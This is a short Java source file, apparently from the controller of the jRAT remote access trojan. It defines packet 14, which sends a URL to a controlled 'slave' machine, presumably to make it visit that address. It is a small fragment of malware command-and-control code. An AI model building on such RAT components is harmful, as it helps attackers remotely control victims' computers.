package jrat.controller.packets.outgoing;

import jrat.controller.Slave;


public class Packet14VisitURL implements OutgoingPacket {

	private String url;

	public Packet14VisitURL(String url) {
		this.url = url;
	}

	@Override
	public void write(Slave slave) throws Exception {
		slave.writeLine(url);
	}

	@Override
	public short getPacketId() {
		return 14;
	}

}
